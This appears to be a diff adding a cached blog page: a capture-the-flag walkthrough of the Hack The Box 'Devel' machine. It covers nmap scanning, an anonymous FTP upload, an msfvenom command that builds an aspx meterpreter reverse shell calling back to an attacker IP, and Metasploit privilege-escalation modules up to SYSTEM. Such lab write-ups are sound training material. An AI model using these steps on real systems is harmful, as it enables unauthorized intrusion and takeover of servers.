@@ -1,0 +1,85 @@
+I"�<ul>
+  <li>Box: Devel
+    <ul>
+      <li>Difficulty: Easy</li>
+      <li>Points: 20</li>
+      <li>Release: 15 Mar 2017</li>
+      <li>IP: 10.10.10.5</li>
+    </ul>
+  </li>
+</ul>
+
+<p>###Initial Enumeration</p>
+
+<p>####Nmap Scanning</p>
+
+<p>Let’s start with a scan of the target ip address:</p>
+
+<p><code class="highlighter-rouge">nmap -sC -A -oN devel.nmap 10.10.10.5</code></p>
+
+<p>The Nmap scan reveals Microsoft FTP port 21 and Microsoft IIS 7.5 port 80 open.</p>
+
+<p>####Website Enumeration</p>
+
+<p>After opening <strong>Firefox</strong> and visit the website <strong>http://10.10.10.5</strong> we get the default IIS 7 webpage.</p>
+
+<p>Dirbuster enumeration provides us no further insight so we move our eyes over to the open FTP port.</p>
+
+<p>####FTP Enumeration</p>
+
+<p>From our Nmap scan, we can see 2 files under the FTP.</p>
+
+<p><img src="/images/posts/htb/devel/devel1.jpg" /></p>
+
+<p>###Exploitation</p>
+
+<p>Connecting anonymously via FTP reveals that it does allow anonymous logins. This misconfiguration is common.</p>
+
+<p><img src="/images/posts/htb/devel/devel2.jpg" /></p>
+
+<p>Since our user can upload files, we can simply create a <strong>aspx</strong> reverse shell and execute it by browsing to the file via the web server.</p>
+
+<p>####Payload Generating/Delivery</p>
+
+<p>The following command will create a aspx file that we will use:</p>
+
+<p><code class="highlighter-rouge">msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.28 LPORT=4444</code></p>
+
+<p><strong>Set up a listener in Metasploit and open the file in the web browser:</strong></p>
+
+<p><img src="/images/posts/htb/devel/devel3.jpg" /></p>
+
+<p>After trying to navigate through some directories we quickly realize we need escalated permissions.</p>
+
+<p>####Privilege</p>
+
+<p>Put the session in the background:</p>
+
+<p><code class="highlighter-rouge">background</code></p>
+
+<p>Then use the following command to suggest local meterpreter exploits that can be used.</p>
+
+<p><img src="/images/posts/htb/devel/devel4.jpg" /></p>
+
+<p><img src="/images/posts/htb/devel/devel5.jpg" /></p>
+
+<p>After testing the first local exploit  <code class="highlighter-rouge">exploit/windows/local/bypassuac_eventvwr</code>, we see that it fails due to the IIS user not being a part of the administrators group. (This is usually default and to be expected)</p>
+
+<p>The next exploit we test is:</p>
+
+<p><code class="highlighter-rouge">exploit/windows/local/ms10_015_kitrap0d</code></p>
+
+<p>This will attempt to create a new session with <strong>SYSTEM</strong> privileges.</p>
+
+<p><img src="/images/posts/htb/devel/devel6.jpg" /></p>
+
+<p>Now that we have the exploit worked, we have SYSTEM access, let’s look for the root and user flags.</p>
+
+<p>The root flag is on the Administrators desktop:</p>
+
+<p><img src="/images/posts/htb/devel/devel7.jpg" /></p>
+
+<p>The user flag is on the “babis” user’s desktop:</p>
+
+<p><img src="/images/posts/htb/devel/devel8.jpg" /></p>
+:ET
